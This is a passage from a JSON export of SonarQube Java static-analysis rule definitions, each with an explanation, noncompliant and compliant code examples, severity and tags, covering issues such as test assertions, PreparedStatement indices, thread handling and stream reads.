br.readLine();\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2737","summary":"\"catch\" clauses should do more than rethrow","tags":["error-handling","unused","finding","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>ZonedDateTime</code> is an immutable representation of a date-time with a time-zone, introduced in Java 8. This class stores all date and\ntime fields, to a precision of nanoseconds, and a time zone, with a zone offset used to handle ambiguous local date times.</p>\n<p>Date truncation to a specific time unit means setting the values up to the specific time unit to zero while keeping the values of the larger time\nunits unchanged.</p>\n<p>The <code>ZonedDateTime</code> class provides a <code>truncatedTo</code> method that allows truncating the date in a significantly faster way than\nthe <code>DateUtils</code> class from Commons Lang.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the projectâs <code>sonar.java.source</code> is lower than <code>8</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic Date trunc(Date date) {\n  return DateUtils.truncate(date, Calendar.SECOND);  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic Date trunc(Date date) {\n  Instant instant = date.toInstant();\n  ZonedDateTime zonedDateTime = instant.atZone(ZoneId.systemDefault());\n  ZonedDateTime truncatedZonedDateTime = zonedDateTime.truncatedTo(ChronoUnit.SECONDS);\n  Instant truncatedInstant = truncatedZonedDateTime.toInstant();\n  return Date.from(truncatedInstant);\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a\n  href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/time/ZonedDateTime.html#truncatedTo(java.time.temporal.TemporalUnit)\">Oracle\n  SDK 20 - ZonedDateTime#truncatedTo</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2718","summary":"\"DateUtils.truncate\" from Apache Commons Lang library should not be used","tags":["performance","java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Thereâs no reason to use literal boolean values or nulls in assertions. Instead of using them with <em>assertEquals</em>, <em>assertNotEquals</em>\nand similar methods, you should be using <em>assertTrue</em>, <em>assertFalse</em>, <em>assertNull</em> or <em>assertNotNull</em> instead (or\n<em>isNull</em> etc. when using Fest). Using them with assertions unrelated to equality (such as <em>assertNull</em>) is most likely a bug.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit3 </li>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> Fest assert </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nAssert.assertTrue(true);  // Noncompliant\nassertThat(null).isNull(); // Noncompliant\n\nassertEquals(true, something()); // Noncompliant\nassertNotEquals(null, something()); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nassertTrue(something());\nassertNotNull(something());\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2701","summary":"Literal boolean values and nulls should not be used in assertions","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the\ncode under test.</p>\n<p>This rule raises an exception when no assertions from any of the following known frameworks are found in a test:</p>\n<ul>\n  <li> AssertJ </li>\n  <li> Awaitility </li>\n  <li> EasyMock </li>\n  <li> Eclipse Vert.x </li>\n  <li> Fest 1.x and 2.x </li>\n  <li> Hamcrest </li>\n  <li> JMock </li>\n  <li> JMockit </li>\n  <li> JUnit </li>\n  <li> Mockito </li>\n  <li> Rest-assured 2.x, 3.x and 4.x </li>\n  <li> RxJava 1.x and 2.x </li>\n  <li> Selenide </li>\n  <li> Springâs <code>org.springframework.test.web.servlet.ResultActions.andExpect()</code> and\n  <code>org.springframework.test.web.servlet.ResultActions.andExpectAll()</code> </li>\n  <li> Truth Framework </li>\n  <li> WireMock </li>\n</ul>\n<p>Furthermore, as new or custom assertion frameworks may be used, the rule can be parametrized to define specific methods that will also be\nconsidered as assertions. No issue will be raised when such methods are found in test cases. The parameter value should have the following format\n<code>&lt;FullyQualifiedClassName&gt;#&lt;MethodName&gt;</code>, where <code>MethodName</code> can end with the wildcard character. For constructors,\nthe pattern should be <code>&lt;FullyQualifiedClassName&gt;#&lt;init&gt;</code>.</p>\n<p>Example:&nbsp;<code>com.company.CompareToTester#compare*,com.company.CustomAssert#customAssertMethod,com.company.CheckVerifier#&lt;init&gt;</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Test\npublic void testDoSomething() {  // Noncompliant\n  MyClass myClass = new MyClass();\n  myClass.doSomething();\n}\n</pre>\n<h3>Compliant solution</h3>\n<p>Example when <code>com.company.CompareToTester#compare*</code> is used as parameter to the rule.</p>\n<pre>\nimport com.company.CompareToTester;\n\n@Test\npublic void testDoSomething() {\n  MyClass myClass = new MyClass();\n  assertNull(myClass.doSomething());  // JUnit assertion\n  assertThat(myClass.doSomething()).isNull();  // Fest assertion\n}\n\n@Test\npublic void testDoSomethingElse() {\n  MyClass myClass = new MyClass();\n  new CompareToTester().compareWith(myClass);  // Compliant - custom assertion method defined as rule parameter\n  CompareToTester.compareStatic(myClass);  // Compliant\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2699","summary":"Tests should include assertions","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TESTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Adding messages to JUnit, FEST and AssertJ assertions is an investment in your future productivity. Spend a few seconds writing them now, and\nyouâll save a lot of time on the other end when either the tests fail and you need to quickly diagnose the problem, or when you need to maintain the\ntests and the assertion messages work as a sort of documentation.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nassertEquals(4, list.size());  // Noncompliant\n\ntry {\n  fail();  // Noncompliant\n} catch (Exception e) {\n  assertThat(list.get(0)).isEqualTo(\"pear\");  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nassertEquals(\"There should have been 4 Fruits in the list\", 4, list.size());\n\ntry {\n  fail(\"And exception is expected here\");\n} catch (Exception e) {\n  assertThat(list.get(0)).as(\"check first element\").overridingErrorMessage(\"The first element should be a pear, not a %s\", list.get(0)).isEqualTo(\"pear\");\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2698","summary":"Test assertions should include messages","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Correctly updating a <code>static</code> field from a non-static method is tricky to get right and could easily lead to bugs if there are multiple\nclass instances and/or multiple threads in play. Ideally, <code>static</code> fields are only updated from <code>synchronized static</code>\nmethods.</p>\n<p>This rule raises an issue each time a <code>static</code> field is updated from a non-static method.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n\n  private static int count = 0;\n\n  public void doSomething() {\n    //...\n    count++;  // Noncompliant\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> STIG Viewer - <a href=\"https://stigviewer.com/stigs/application_security_and_development/2024-12-06/finding/V-222567\">Application Security and\n  Development: V-222567</a> - The application must not be vulnerable to race conditions. </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2696","summary":"Instance methods should not write to \"static\" fields","tags":["multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p><code>PreparedStatement</code> is an object that represents a precompiled SQL statement, that can be used to execute the statement multiple times\nefficiently.</p>\n<p><code>ResultSet</code> is the Java representation of the result set of a database query obtained from a <code>Statement</code> object. A default\n<code>ResultSet</code> object is not updatable and has a cursor that moves forward only.</p>\n<p>The parameters in <code>PreparedStatement</code> and <code>ResultSet</code> are indexed beginning at 1, not 0. When an invalid index is passed to\nthe <code>PreparedStatement</code> or <code>ResultSet</code> methods, an <code>IndexOutOfBoundsException</code> is thrown. This can cause the program\nto crash or behave unexpectedly, leading to a poor user experience.</p>\n<p>This rule raises an issue for the <code>get</code> methods in <code>PreparedStatement</code> and the <code>set</code> methods in\n<code>ResultSet</code>.</p>\n<h2>How to fix it</h2>\n<p>Ensure the index passed to the <code>PreparedStatement</code> and <code>ResultSet</code> methods is valid.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nPreparedStatement ps = con.prepareStatement(\"SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?\");\nps.setDate(0, date);  // Noncompliant\nps.setDouble(3, salary);  // Noncompliant\n\nResultSet rs = ps.executeQuery();\nwhile (rs.next()) {\n  String fname = rs.getString(0);  // Noncompliant\n  // ...\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nPreparedStatement ps = con.prepareStatement(\"SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?\");\nps.setDate(1, date);\nps.setDouble(2, salary);\n\nResultSet rs = ps.executeQuery();\nwhile (rs.next()) {\n  String fname = rs.getString(1);\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.sql/java/sql/PreparedStatement.html\">Oracle SDK 20 - PreparedStatement</a>\n  </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.sql/java/sql/ResultSet.html\">Oracle SDK 20 - ResultSet</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.sql/java/sql/Connection.html#prepareStatement(java.lang.String)\">Oracle SDK 20\n  - Connection#prepareStatement</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2695","summary":"\"PreparedStatement\" and \"ResultSet\" methods should be called with valid indices","tags":["sql"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A non-static inner class has a reference to its outer class, and access to the outer class' fields and methods. That class reference makes the\ninner class larger and could cause the outer class instance to live in memory longer than necessary.</p>\n<p>If the reference to the outer class isnât used, it is more efficient to make the inner class <code>static</code> (also called nested). If the\nreference is used only in the class constructor, then explicitly pass a class reference to the constructor. If the inner class is anonymous, it will\nalso be necessary to name it.</p>\n<p>However, while a nested/<code>static</code> class would be more efficient, itâs worth noting that there are semantic differences between an inner\nclass and a nested one:</p>\n<ul>\n  <li> an inner class can only be instantiated within the context of an instance of the outer class. </li>\n  <li> a nested (<code>static</code>) class can be instantiated independently of the outer class. </li>\n</ul>\n<h2>How to fix it</h2>\n<p>There are two scenarios in which this rule will raise an issue:</p>\n<ol>\n  <li> On an <em>inner class</em>: make it <code>static</code>. </li>\n  <li> On a <em>local class</em>: extract it as a <code>static</code> <em>inner class</em>. </li>\n</ol>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>Inner classes that donât use the outer class reference should be static.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Fruit {\n  // ...\n\n  public class Seed {  // Noncompliant; there's no use of the outer class reference so make it static\n    int germinationDays = 0;\n    public Seed(int germinationDays) {\n      this.germinationDays = germinationDays;\n    }\n    public int getGerminationDays() {\n      return germinationDays;\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Fruit {\n  // ...\n\n  public static class Seed {\n    int germinationDays = 0;\n    public Seed(int germinationDays) {\n      this.germinationDays = germinationDays;\n    }\n    public int getGerminationDays() {\n      return germinationDays;\n    }\n  }\n}\n</pre>\n<p>Local classes that donât use the outer class reference should be extracted as a static inner classes.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\npublic class Foo {\n  public Foo() {\n    class Bar { // Noncompliant\n      void doSomething() {\n        // ...\n      }\n    }\n    new Bar().doSomething();\n  }\n\n  public void method() {\n    class Baz { // Noncompliant\n      void doSomething() {\n        // ...\n      }\n    }\n    new Baz().doSomething();\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\npublic class Foo {\n  public Foo() {\n    new Bar().doSomething();\n  }\n\n  public void method()  {\n    new Baz().doSomething();\n  }\n\n  private static class Bar { // Compliant\n    void doSomething() {\n      // ...\n    }\n  }\n\n  private static class Baz { // Compliant\n    void doSomething() {\n      // ...\n    }\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/javaOO/nested.html\">Oracle Java SE - Nested Classes</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/javaOO/localclasses.html\">Oracle Java SE - Local Classes</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.geeksforgeeks.org/difference-between-static-and-non-static-nested-class-in-java/\">GeeksforGeeks - Difference between\n  static and non-static nested class in Java</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2694","summary":"Inner classes which do not reference their owning classes should be \"static\"","tags":["performance"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>The problem with invoking <code>Thread.start()</code> in a constructor is that youâll have a confusing mess on your hands if the class is ever\nextended because the superclass' constructor will start the thread before the child class has truly been initialized.</p>\n<p>This rule raises an issue any time <code>start</code> is invoked in the constructor of a non-<code>final</code> class.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class MyClass {\n\n  Thread thread = null;\n\n  public MyClass(Runnable runnable) {\n    thread = new Thread(runnable);\n    thread.start(); // Noncompliant\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/FDdGBQ\">CERT, TSM02-J.</a> - Do not use background threads during class initialization </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2693","summary":"Threads should not be started in constructors","tags":["multi-threading","cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Most checks against an <code>indexOf</code> value compare it with -1 because 0 is a valid index. Checking against <code>&gt; 0</code> ignores the\nfirst element, which is likely a bug.</p>\n<pre>\nString name = \"ishmael\";\n\nif (name.indexOf(\"ish\") &gt; 0) { // Noncompliant\n  // ...\n}\n</pre>\n<p>Moreover, if the intent is merely to check the inclusion of a value in a <code>String</code> or a <code>List</code>, consider using the\n<code>contains</code> method instead.</p>\n<pre>\nString name = \"ishmael\";\n\nif (name.contains(\"ish\") {\n  // ...\n}\n</pre>\n<p>If the intent is really to skip the first element, comparing it with <code>&gt;=1</code> will make it more straightforward.</p>\n<pre>\nString name = \"ishmael\";\n\nif (name.indexOf(\"ish\") &gt;= 1) {\n  // ...\n}\n</pre>\n<p>This rule raises an issue when an <code>indexOf</code> value retrieved from a <code>String</code> or a <code>List</code> is tested against\n<code>&gt; 0</code>.</p>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2692","summary":"\"indexOf\" checks should not be for positive numbers","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>An <code>ObjectOutputStream</code> writes primitive data types and graphs of Java objects to an <code>OutputStream</code>. The objects can be read\n(reconstituted) using an <code>ObjectInputStream</code>.</p>\n<p>When <code>ObjectOutputStream</code> is used with files opened in append mode, it can cause data corruption and unexpected behavior. This is\nbecause when <code>ObjectOutputStream</code> is created, it writes metadata to the output stream, which can conflict with the existing metadata when\nthe file is opened in append mode. This can lead to errors and data loss.</p>\n<p>When used with serialization, an <code>ObjectOutputStream</code> first writes the serialization stream header. This header should appear once per\nfile at the beginning. When youâre trying to read your object(s) back from the file, only the first one will be read successfully, and a\n<code>StreamCorruptedException</code> will be thrown after that.</p>\n<h2>How to fix it</h2>\n<p>Open the file to use the default action (writes stream header).</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nFileOutputStream fos = new FileOutputStream(fileName , true);  // fos opened in append mode\nObjectOutputStream out = new ObjectOutputStream(fos);  // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nFileOutputStream fos = new FileOutputStream(fileName);\nObjectOutputStream out = new ObjectOutputStream(fos);\n</pre>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://docs.jboss.org/jbossas/javadoc/4.0.2/org/jboss/util/stream/AppendingObjectOutputStream.java.html\">JBoss -\n  AppendingObjectOutputStream</a> </li>\n</ul>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/io/ObjectOutputStream.html\">Oracle SE 20 - ObjectOutputStream</a>\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2689","summary":"Files opened in append mode should not be used with \"ObjectOutputStream\"","tags":["serialization","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Having inconsistent indentation and omitting curly braces from a control structure, such as an <code>if</code> statement or <code>for</code> loop,\nis misleading and can induce bugs.</p>\n<p>This rule raises an issue when the indentation of the lines after a control structure indicates an intent to include those lines in the block, but\nthe omission of curly braces means the lines will be unconditionally executed once.</p>\n<p>The following patterns are recognized:</p>\n<pre>\nif (condition)\n  firstActionInBlock();\n  secondAction();  // Noncompliant: secondAction is executed unconditionally\nthirdAction();\n</pre>\n<pre>\nif (condition) firstActionInBlock(); secondAction();  // Noncompliant: secondAction is executed unconditionally\n</pre>\n<pre>\nif (condition) firstActionInBlock();\n  secondAction();  // Noncompliant: secondAction is executed unconditionally\n</pre>\n<pre>\nif (condition); secondAction();  // Noncompliant: secondAction is executed unconditionally\n</pre>\n<pre>\nfor (int i = 0; i &lt; array.length; i++)\n  str = array[i];\n  doTheThing(str);  // Noncompliant: executed only on the last element\n</pre>\n<p>Note that this rule considers tab characters to be equivalent to 1 space. When mixing spaces and tabs, a code may look fine in one editor but be\nconfusing in another configured differently.</p>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/483\">CWE-483 - Incorrect Block Delimitation</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/MzZGBQ\">CERT, EXP52-J.</a> - Use braces for the body of an if, for, or while statement </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2681","summary":"Multiline blocks should be enclosed in curly braces","tags":["cwe","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FORMATTED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>Reader.read()</code> and the <code>BufferedReader.readLine()</code> are used for reading data from a data source. The return value of\nthese methods is the data read from the data source, or <code>null</code> when the end of the data source is reached. If the return value is ignored,\nthe data read from the source is thrown away and may indicate a bug.</p>\n<p>This rule raises an issue when the return values of <code>Reader.read()</code> and <code>BufferedReader.readLine()</code> and their subclasses are\nignored or merely null-checked.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doSomethingWithFile(String fileName) {\n  try(BufferedReader buffReader = new BufferedReader(new FileReader(fileName))) {\n    while (buffReader.readLine() != null) { // Noncompliant\n      // ...\n    }\n  } catch (IOException e) {\n    // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doSomethingWithFile(String fileName) {\n  try(BufferedReader buffReader = new BufferedReader(new FileReader(fileName))) {\n    String line = null;\n    while ((line = buffReader.readLine()) != null) {\n      // ...\n    }\n  } catch (IOException e) {\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/io/Reader.html#read()\">Oracle SDK 20 - Reader.read()</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/io/BufferedReader.html#readLine()\">Oracle SDK 20 -\n  BufferedReader.readLine()</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2677","summary":"\"read\" and \"readLine\" return values should be used","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>This rule involves the use of <code>Math.abs</code> and negation on numbers that could be <code>MIN_VALUE</code>. It is a problem because it can\nlead to incorrect results and unexpected behavior in the program.</p>\n<p>When <code>Math.abs</code> and negation are used on numbers that could be <code>MIN_VALUE</code>, the result can be incorrect due to integer\noverflow. Common methods that can return a <code>MIN_VALUE</code> and raise an issue when used together with <code>Math.abs</code> are:</p>\n<ul>\n  <li> <code>Random.nextInt()</code> and <code>Random.nextLong()</code> </li>\n  <li> <code>hashCode()</code> </li>\n  <li> <code>compareTo()</code> </li>\n</ul>\n<p>Alternatively, the <code>absExact()</code> method throws an <code>ArithmeticException</code> for <code>MIN_VALUE</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic void doSomething(String str) {\n  if (Math.abs(str.hashCode()) &gt; 0) { // Noncompliant\n    // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic void doSomething(String str) {\n  if (str.hashCode() != 0) {\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/lang/Math.html#abs(int)\">Oracle SDK 20 - Math.abs(int)</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2676","summary":"\"Math.abs\" and negation should not be used on numbers that could be \"MIN_VALUE\"","tags":["bug","suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>readObject</code> method is implemented when a <code>Serializable</code> object requires special handling to be reconstructed from a\nfile. The object created by <code>readObject</code> is accessed only by the thread that called the method, thus using the <code>synchronized</code>\nkeyword in this context is unnecessary and causes confusion.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate synchronized void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException { // Noncompliant\n  //...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate void readObject(java.io.ObjectInputStream in)\n     throws IOException, ClassNotFoundException { // Compliant\n  //...\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/io/Serializable.html\">Oracle SDK 20 - Serializable</a> </li>\n  <li> <a href=\"https://docs.oracle.com/en/java/javase/20/docs/api/java.base/java/io/ObjectInputStream.html\">Oracle SDK 20 - ObjectInputStream</a>\n  </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.baeldung.com/java-serialization\">Serialization in Java</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2675","summary":"\"readObject\" should not be \"synchronized\"","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>You cannot assume that any given stream reading call will fill the <code>byte[]</code> passed in to the method. Instead, you must check the value\nreturned by the read method to see how many bytes were read. Fail to do so, and you introduce bug that is both harmful and difficult to reproduce.</p>\n<p>Similarly, you cannot assume that <code>InputStream.skip</code> will actually skip the requested number of bytes, but must check the value returned\nfrom the method.</p>\n<p>This rule raises an issue when an <code>InputStream.read</code> method that accepts a <code>byte[]</code> is called, but the return value is not\nchecked, and when the return value of <code>InputStream.skip</code> is not checked. The rule also applies to <code>InputStream</code> child\nclasses.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic void doSomething(String fileName) {\n  try {\n    InputStream is = new InputStream(file);\n    byte [] buffer = new byte[1000];\n    is.read(buffer);  // Noncompliant\n    // ...\n  } catch (IOException e) { ... }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic void doSomething(String fileName) {\n  try {\n    InputStream is = new InputStream(file);\n    byte [] buffer = new byte[1000];\n    int count = 0;\n    while (count = is.read(buffer) &gt; 0) {\n      // ...\n    }\n  } catch (IOException e) { ... }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/VzdGBQ\">CERT, FIO10-J.</a> - Ensure the array is filled when using read() to fill an array </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2674","summary":"The value returned from a stream read should be checked","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<p>This rule is deprecated; use {rule:javasecurity:S6173} instead.</p>\n<h2>Why is this an issue?</h2>\n<p>Dynamically loaded classes could contain malicious code executed by a static class initializer. I.E. you wouldnât even have to instantiate or\nexplicitly invoke methods on such classes to be vulnerable to an attack.</p>\n<p>This rule raises an issue for each use of dynamic class loading.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString className = System.getProperty(\"messageClassName\");\nClass clazz = Class.forName(className);  // Noncompliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a 